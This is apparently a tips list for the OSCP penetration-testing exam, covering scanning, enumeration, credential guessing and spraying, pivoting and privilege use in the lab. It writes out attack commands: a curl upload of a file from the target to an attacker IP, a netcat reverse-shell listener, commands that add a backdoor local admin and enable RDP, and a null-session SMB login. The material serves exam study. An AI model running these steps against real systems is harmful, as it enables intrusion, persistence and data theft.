## oscp-tips ##
### Tips and Tricks for OSCP and Beyond! ###

1 - Run a quick port scanner like threader3000 or rustscan first. You can save good amount of time by this way, for example threader3000 scans all ports and suggests nmap only for open ports only./n 
2 - Run nmap -sS for all ports, compare open ports with previous scan.
3 - Run -sU (UDP) for well-known ports.
4 - Run gobuster in dir mode for all http/https ports with common world list. See if anything interesting.
5 - Run gobuster in fuzz mode with common world list.
6 - Run gobuster recursively for anything interesting, like you find out a script directory, try to find out directories within script. You should do this upto 3-4 level.
7 - Run gobuster for file extension using -x, like for php or aspx.
8 - Check UDP scan, see if SNMP is allowed or not. If SNMP port is open use snmpwalk with well-known default community strings.
9 - Run snmp with extended MIB, check hacktricks for more details.
10 - Check HTML code, check title of the page, sometimes you will get vulnerable system name from title itself.
11 - Check nmap scan, try to connect to every port using telnet or nc. Send some random keys and see the response.
12 - Check hacktricks (https://book.hacktricks.xyz/) if you don't know or aware about pentesting of a port or service.
13 - Use rpcclient to enum users and other details if RPC ports are open.
14 – Revert machines and perform scan again.
15 – Listen reverse shell on same ports which are open on victim. For example, if port 445 is open on victim, bidirectional traffic might be allowed on same port too. You can use “nc -lvnp 445” to catch reverse shell on Kali in that case, if others are not working. Try port 80 and 443 as well.
16 – Always try default credentials wherever applicable. For example, admin/password, administrator/password or admin/admin. Search google for default credentials as well.
17 – Always try username and password as machine name as credential. For example, if machine name is “berlin”, try to login FTP (or any other service) with berlin/berlin. Try username without password.
18 – If machine is running a portal with employee name (or email), they can be potential usernames. Make a list and use it for spraying.
19 – Use “updog” to transfer data between target and Kali. You can upload data from target to Kali using below command.
curl.exe -v -XPOST -F "file=@./SharpHound.ps1;filename=SharpHound.ps1" -F "path=." http://192.168.45.229:9090/upload
Please note that for above command file “SharpHound.ps1” should be saved in same directory from where you are running command. You can use impacket-smbserver as well.
20 – If using msfvenom reverse shell, use msfconsole multi handler to catch it. 
21 - Compile C/C++ exploit with "-static" flag, it will allow to include all required libraries as few might be missing on target. You can avoid “GLIBC not found” error by compiling with “-static”.
22 – If you can get root on a Windows machine (standalone or form AD set), install nmap on that and scan remaining machines from there. Scan will be very fast, you will surely save time.
23 – If you are not able to copy files directly to target machine copy it to another target and copy from there. For example, if you have root access on MS01 and low-level access on MS02. It is possible that you might not be allowed to copy files (like winPEAS) directly from Kali to MS02. Create a share folder on MS01, copy files to that folder. Now you can copy files from MS01 to MS02.
24 – Use ligolo-ng for pivoting between machines. You can use script from https://github.com/isr4r/misc-scripts/blob/master/ligolo.sh to configure ligolo easily.
25 – Use chisel for local port forwarding. For example, a service is running on target which is only locally allowed (or from 127.0.0.1). You should use chisel in this situation to open access for this service from Kali.
26 – Always check for ports open or allowed locally (for 127.0.0.1). You can connect to these ports on same target machine using “telnet localhost <port number>”. It will give you an idea if something interesting is running.
27 – For AD Set, after getting system level access, which might be over CLI, create a new account as local admin, enable RDP, login and do further enum like running mimikatz. You can use below commands to create user and enable RDP.
For RDP (PowerShell commands)
•	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
•	Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

For Creating User
•	net user user1 Pass123 /add 
•	net localgroup Administrators user1 /add

28 – Try reverse shell from https://www.revshells.com/, keep trying as one of them will work in lab and in exam too.
29 – Try smbclient, FTP, rpcclient as null user or anonymous user or guest user as well. For example,
•	smbclient -U “” -L 192.168.120.20  
30 – If machine has an open source project check its github or code repo to understand directory structure.


